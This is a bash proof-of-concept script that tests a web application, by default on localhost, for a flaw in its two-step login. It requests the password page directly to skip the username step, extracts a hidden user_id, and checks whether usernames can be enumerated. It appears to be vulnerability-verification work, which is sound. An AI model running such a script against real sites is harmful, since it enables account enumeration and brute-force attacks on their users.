#!/bin/bash

# POC: Two-Step Authentication Bypass via Direct URL Access
# This demonstrates bypassing step 1 of authentication by directly accessing /password/{username}

TARGET_URL="${TARGET_URL:-http://localhost:5000}"
VALID_USERNAME="test"
INVALID_USERNAME="nonexistent_user_xyz"

echo "=========================================="
echo "Two-Step Authentication Bypass POC"
echo "=========================================="
echo ""

echo "[*] Target: $TARGET_URL"
echo ""

echo "=== NORMAL FLOW (for comparison) ==="
echo "[1] Step 1: POST username to /"
STEP1_OUTPUT=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST "$TARGET_URL/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$VALID_USERNAME" \
  -L --max-redirs 0)

STEP1_STATUS=$(echo "$STEP1_OUTPUT" | grep "HTTP_STATUS:" | cut -d':' -f2)
echo "[*] HTTP Status: $STEP1_STATUS"
echo "[*] This shows the normal flow redirects to step 2"
echo ""

echo "=== BYPASS: Direct Access to Step 2 ==="
echo "[2] Attempting direct GET to /password/$VALID_USERNAME (bypassing step 1)"
echo ""

BYPASS_OUTPUT=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X GET "$TARGET_URL/password/$VALID_USERNAME")

HTTP_STATUS=$(echo "$BYPASS_OUTPUT" | grep "HTTP_STATUS:" | cut -d':' -f2)
RESPONSE_BODY=$(echo "$BYPASS_OUTPUT" | sed '/HTTP_STATUS:/d')

echo "[*] HTTP Status Code: $HTTP_STATUS"
echo ""

if [ "$HTTP_STATUS" = "200" ]; then
    echo "[+] SUCCESS: Direct access allowed! Application served step 2 without completing step 1"
    echo ""
    
    # Extract key indicators from response
    if echo "$RESPONSE_BODY" | grep -q "Welcome"; then
        WELCOME_MSG=$(echo "$RESPONSE_BODY" | grep -o "Welcome[^<]*" | head -1 | sed 's/[[:space:]]*$//')
        echo "[+] Found welcome message: '$WELCOME_MSG'"
    fi
    
    if echo "$RESPONSE_BODY" | grep -q 'type="password"'; then
        echo "[+] Password input field present in response"
    fi
    
    if echo "$RESPONSE_BODY" | grep -q "user_id"; then
        USER_ID=$(echo "$RESPONSE_BODY" | grep -o 'value="[0-9]*"' | head -1 | cut -d'"' -f2)
        if [ ! -z "$USER_ID" ]; then
            echo "[+] Hidden user_id field found: $USER_ID"
        fi
    fi
    
    if echo "$RESPONSE_BODY" | grep -q 'name="username"'; then
        echo "[+] Username field present in form"
    fi
    
    echo ""
    echo "[!] VULNERABILITY CONFIRMED: Authentication flow can be bypassed"
    echo "[!] Attacker can skip step 1 and directly access step 2 for any valid username"
    VULN_CONFIRMED=1
else
    echo "[-] Direct access returned HTTP $HTTP_STATUS (not 200)"
    echo "[*] Flow control may be properly implemented"
    VULN_CONFIRMED=0
fi

echo ""
echo "=== VERIFICATION: Testing with invalid username ==="
echo "[3] Attempting direct GET to /password/$INVALID_USERNAME"
echo ""

INVALID_OUTPUT=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X GET "$TARGET_URL/password/$INVALID_USERNAME" --max-redirs 0)
INVALID_STATUS=$(echo "$INVALID_OUTPUT" | grep "HTTP_STATUS:" | cut -d':' -f2)

echo "[*] HTTP Status Code for invalid username: $INVALID_STATUS"

if [ "$INVALID_STATUS" = "302" ] || [ "$INVALID_STATUS" = "301" ]; then
    echo "[*] Invalid username triggers redirect (expected behavior)"
    echo "[+] Application correctly rejects invalid usernames"
    echo "[!] This confirms the endpoint validates usernames, making the bypass exploitable for enumeration"
elif [ "$INVALID_STATUS" = "200" ]; then
    echo "[*] Invalid username also returns 200 - different behavior than expected"
fi

echo ""
echo "=== IMPACT SUMMARY ==="
if [ "$VULN_CONFIRMED" = "1" ]; then
    echo "[VULNERABLE] The application allows bypassing step 1 of authentication:"
    echo "  1. Attackers can bypass step 1 authentication checks"
    echo "  2. Multi-step flow control is not enforced"
    echo "  3. Combined with username enumeration, enables direct password attacks"
    echo "  4. Simplifies automation of brute force attacks"
    echo "  5. May evade security controls monitoring only step 1"
else
    echo "[SECURE] The application appears to properly enforce flow control"
fi
echo ""
echo "=========================================="

exit 0